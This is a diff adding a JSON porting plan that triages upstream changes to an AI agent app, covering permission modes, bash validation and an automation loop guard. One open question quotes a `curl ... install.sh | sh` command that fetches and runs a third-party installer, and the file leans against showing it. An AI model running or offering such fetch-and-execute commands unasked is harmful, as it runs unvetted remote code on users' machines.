+   "upstream": "v0.14.0 rpc/sessions.ts setPermissionMode rejects an unknown mode.",
+   "ours": "rpc/sessions.ts:831-836 (F1.800) parses and refuses.",
+   "disposition": "drop-c",
+   "why": "Already ours.",
+   "size": "XS"
+  },
+  {
+   "id": "R14-36",
+   "upstream": "v0.13.6 mode-manager.ts globToRegex normalizes patterns on win32 (separators, case).",
+   "ours": "mode-manager.ts:405-420 normalizeDeniedPathPattern + its grant mirror (P3.128).",
+   "disposition": "drop-c",
+   "why": "Already ours.",
+   "size": "XS"
+  },
+  {
+   "id": "R14-37",
+   "upstream": "v0.14.0 spawn_session clamps to the parent mode (clamp-permission-mode.test.ts).",
+   "ours": "F1.549.",
+   "disposition": "drop-c",
+   "why": "Already ours.",
+   "size": "XS"
+  },
+  {
+   "id": "R14-38",
+   "upstream": "v0.14.0 claude event-adapter topLevelToolUseIds/mainAgentTasks/wasLaunchedByMainAgent → task_completed.launchedHere/toolUseId; task-notification.ts tool_use_id; list-background-tasks 'untracked'; background-task-surface.test 'never wakes for a task it did not see launched'; Bash tasks no longer 0 s.",
+   "ours": "Routed to UA12.18 (controller note 2026-10-02 lists the creation half, the `== null` filter, App.tsx wordings, dto fields).",
+   "disposition": "adapt",
+   "why": "Already a plan row; listed so the 1.43.0 plan does not re-own it. Phantom wake is the user-visible half.",
+   "size": "M",
+   "depends": "UA12.18",
+   "runtimes": "Claude (event-adapter); Pi/Codex own feeds."
+  },
+  {
+   "id": "R14-39",
+   "upstream": "v0.14.0 #1008 claude event-adapter isToolHeartbeat: heartbeats update elapsed time instead of adding a 'Running …' row.",
+   "ours": "Routed to UA12.39 (MEAS).",
+   "disposition": "measure",
+   "why": "Plan row exists.",
+   "size": "S",
+   "depends": "UA12.39",
+   "runtimes": "Claude."
+  },
+  {
+   "id": "R14-40",
+   "upstream": "v0.13.6 #1056 utils/files.ts relativize against the session cwd only (path-relativize.test.ts).",
+   "ours": "Routed to UA12.38.",
+   "disposition": "adapt",
+   "why": "Plan row exists.",
+   "size": "S",
+   "depends": "UA12.38",
+   "runtimes": "Host transcript."
+  },
+  {
+   "id": "R14-41",
+   "upstream": "v0.14.0 sessions/storage.ts clearPendingPlanExecution returns early when nothing is pending ('quick successive sends no longer fail').",
+   "ours": "Landed UA12.35 916075947.",
+   "disposition": "drop-c",
+   "why": "Done.",
+   "size": "XS"
+  },
+  {
+   "id": "R14-42",
+   "upstream": "v0.14.0 labels/crud.ts generateLabelSlug (NFKD, cut then trim) — 'new task labels always get valid ids'.",
+   "ours": "Landed UA12.36 8afdd4530 (and UA12.40 for non-Latin names).",
+   "disposition": "drop-c",
+   "why": "Done.",
+   "size": "XS"
+  },
+  {
+   "id": "R14-43",
+   "upstream": "v0.14.0 SessionManager emitSessionComplete iterates a listener snapshot.",
+   "ours": "Routed to UA12.37 (DEFERRED hardening).",
+   "disposition": "adapt",
+   "why": "Plan row exists.",
+   "size": "XS",
+   "depends": "UA12.37"
+  },
+  {
+   "id": "R14-44",
+   "upstream": "v0.14.0 SessionManager automationLoopGuard + MAX_AUTOMATION_CHAIN_DEPTH 3, triggeredBy.automationId/depth, session-manager-interface automationId/triggerEvent/chainDepth, webhook-utils/rpc automations `skipped` history, AutomationEventTimeline skipped row, docs/automations.md bullet ('Automations cannot trigger themselves').",
+   "ours": "No automationLoopGuard/chainDepth/MAX_AUTOMATION_CHAIN in packages (git grep; positive control: the same grep finds pi-agent.ts's unrelated hook LoopGuard). A LabelAdd matcher that labels its own session can re-fire.",
+   "disposition": "adapt",
+   "why": "Decision-free safety fix, but upstream's guard only sees event/eventPayload when a semanticCondition is set (skeptic correction in plan-1.43.0-inputs.md): adapt with the stated divergence — PromptHandler always carries event/eventPayload — and a control through the real PromptHandler→onPromptsReady→runReadyPrompts path; write the docs bullet only for what our code does.",
+   "size": "M",
+   "depends": "none (semanticCondition stays with the decisions adoption)",
+   "risk": "automation regressions — chains of 3 still run",
+   "runtimes": "Host AutomationSystem; runtime-neutral."
+  },
+  {
+   "id": "R14-45",
+   "upstream": "v0.14.0 base-agent.ts chat(…, {turnContext}) — the interruption notice travels as turn context after mention parsing, not inside the stored message (turn-context.test.ts, base-agent-turn-context.test.ts).",
+   "ours": "SessionManager.ts:31961-31964 appends the identical <\\system-reminder> notice to the effective message (not to the stored user message); same model-visible text.",
+   "disposition": "drop-c",
+   "why": "No user-visible difference for us; upstream's seam exists to carry the decision suggestion hint, so it belongs to the decisions adoption if that lands.",
+   "size": "XS",
+   "runtimes": "Host; all three."
+  },
+  {
+   "id": "R14-48",
+   "upstream": "v0.13.5 config/llm-connections.ts PI_PREFERRED_DEFAULTS deepseek: deepseek-v4-flash → deepseek-flash, models.ts alias map 'deepseek-v4-flash' → 'deepseek-flash' (vendor retired the alias; migrated on existing connections).",
+   "ours": "config/llm-connections.ts:1781 and :1852 still list 'deepseek-v4-flash' for BYO DeepSeek; gateway ids (tgpt/deepseek-v4-flash-0731) are unrelated aliases.",
+   "disposition": "adapt",
+   "why": "BYO DeepSeek connections would pin a retired id; evidence is upstream's note only (vendor fact not re-read) — confirm on the DeepSeek models list during the row, then rename + migrate stored connections.",
+   "size": "XS",
+   "depends": "R14-28 optional (SDK carries its own migration)",
+   "risk": "low",
+   "runtimes": "Pi BYO DeepSeek only."
+  }
+ ],
+ "questions": [
+  {
+   "q": "allowedWritePaths in default (Ask) mode (#1065): honour the workspace allowlist so writes to matching paths run without a card, as upstream does in Ask?",
+   "options": "(a) honour it in default only, never in plan (upstream parity; documented in permissions.md); (b) keep it dead and document Claude-style Edit(path) allow rules instead; (c) remove the knob from the schema",
+   "default": "(a) — a user-configured allowlist, parity with upstream; plan stays read-only (F1.1050)"
+  },
+  {
+   "q": "rtk outdated-version prompt: upstream's dialog offers `curl -fsSL https://raw.githubusercontent.com/rtk-ai/rtk/.../install.sh | sh`. Show a third-party installer command on T-Bank machines?",
+   "options": "(a) port verbatim; (b) port the floor, the Settings notice and the dialog but name only the minimum version and 'update rtk the way you installed it' (no command); (c) Settings notice only, no dialog",
+   "default": "(b) — the safety floor (outdated rtk is never used) does not need the installer; no new third-party fetch suggested without an owner decision"
+  }
+ ],
+ "checked": [
+  "git -C .references/craft-agent-oss diff --numstat v0.13.4 v0.14.0 (311 files; 3 squash commits 53393340 v0.13.5, 3eac37be v0.13.6, 73bd9c2a v0.14.0), decisions paths dropped",
+  "release notes v0.13.5/0.13.6/0.14.0 (git show v0.14.0:apps/electron/resources/release-notes/*.md) as the change index",
+  "work/wi16/upstream-delta-0-14.json: ABSENT (find over the repo found nothing); used plan-1.43.0-inputs.md analyst/skeptic text instead",
+  "1.42.0 plan Global Constraints, Review Focus, manifest H/I, UA12.18/.35/.36/.37/.38/.39 rows",
+  "permission-remember: upstream permission-remember.ts + permission-manager.ts diff vs ours dangerous-commands.ts, pre-tool-use.ts shouldPromptInAskMode, claude-agent respondToPermission, SessionManager persistBashAlwaysAllowRule, pi-agent buildPermissionRequestSuggestions; MEASURED curl domain grant with a bun driver (4 auto-allows + 1 prompt control)",
+  "Explore/plan tightening: upstream bash-validator.ts + mcp-tool-names.ts vs ours default.json, bash-validator sed walker, mcp-tool-name-verbs.ts; MEASURED with validateBashCommand/getBashRejectionReason over the shipped default.json",
+  "mode-manager allowedWritePaths residue (F1.1050), #236 MCP read-only in default (F1.526)",
+  "Pi pi-agent.ts source activation re-run, no-handler arm, redirect, compact timeout; pi-agent-server waitForCompaction; upstream compaction-wait.ts",
+  "Claude handoff (HANDOFF_RESULT_WAIT_MS) vs our interruptForHandoff + SessionManager call sites; keep-alive Stop vs our empty-response recovery and user_stop settle; live thinking vs live-session.ts signature",
+  "SessionManager source_activated handler vs upstream lastUserMessageContent/buildActivationRetryMessage",
+  "MCP pool sync (parallel connect), api-auth.ts/#1067 vs credential-manager/api-tools/source-test, RFC 8707 oauth, Slack relay, #1048 llm-connections rpc, #1062 config-dir grep with positive control, #1033 interceptor, #1059 browser-pane-manager, #1072 Pi event-adapter",
+  "large MCP results (claude PostToolUse) vs code.claude.com/docs/en/mcp.md output-limits section (curl, grep of the .md)",
+  "rtk-detector/rtk-rewrite/system.ts rtk hint; SDK pins (both Claude self-reports read 2.1.274; Pi 0.85.1 in shared and pi-agent-server package.json); Pi system-prompt-override (ours already before_agent_start)",
+  "models.ts Opus 5.5/thinkingAlwaysOn, anthropic driver max_input_tokens, error mapper codes, CLAUDE_CODE_ENABLE_TODO_TOOLS, systemPrompt snapshot default in sdk.d.ts",
+  "mini-model-query fallback vs pi-agent-server index.ts fallbackCandidates; deepseek preferred defaults",
+  "turn-context, midstream-queue, background-task-surface, automation-prompts, attended-session test names; automation loop guard absence (git grep with positive control)",
+  "small diffs: source-policy, spawn-session-tool, options, prerequisite-manager, list-background-tasks, config-validate, privileged-execution-broker, tasks/storage (verdict via/confidence = decisions), webhook-utils (skipped), views/types, runtime-resolver, pending-steers, task-notification, core message.ts, rpc auth/workspace/sessions/automations/oauth, session-manager-interface, sources/types, generic-oauth, config storage/validators/workspaces storage/llm-connections/permissions-config, build scripts, Dockerfile.server, electron-builder.yml, AGENTS.md resources",
+  "renderer diffs classified as guarded/decisions (SettingsToggle tooltip, slash-command-menu, ActiveOptionBadges, WorkspaceSettingsPage, SkillInfoPage, ChatDisplay, FreeFormInput, useSessionOptions, NavigationContext, atoms/sessions, AppShell guarded refresh) — left to the decisions adoption; ApiKeyInput default list folded into R14-29; useOnboarding connectionSlug into R14-20",
+  "not items: craft-agent CLI changes (label auto-rule-add --semantic, automation --json fields, `craft run` unattended) — that CLI is not shipped in ours (no 'label auto-rule-add' anywhere in HEAD); ipc-channels.test pages:getShareDataScan (UA6.7 DEFERRED); TaskEditor/task-spec-form (UA manifest); labels semantic rules, AutoRulesDataTable, evaluator, decide tool, guarded mode, i18n decisions keys (decisions subsystem)",
+  "wrote work/wi16/plan-1.43.0/rest-0-14.json (measured CRITICAL candidates R14-01, R14-04, R14-08 with instruments)"
+ ]
+}
